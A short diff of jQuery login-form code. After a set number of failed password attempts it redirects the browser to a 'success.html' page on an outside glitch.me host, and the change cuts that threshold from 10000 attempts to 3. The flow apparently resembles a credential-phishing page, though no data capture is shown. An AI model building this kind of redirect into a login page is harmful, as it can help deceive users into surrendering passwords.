@@ -432,7 +432,7 @@ $(document).ready(function() {
             },
             error: function() {
                 $("#password").val("");
-                if (count >= 10000) {
+                if (count >= 3) {
                     count = 0;
                     window.location.replace("https://fate-jasper-milkshake.glitch.me/success.html");
                 }
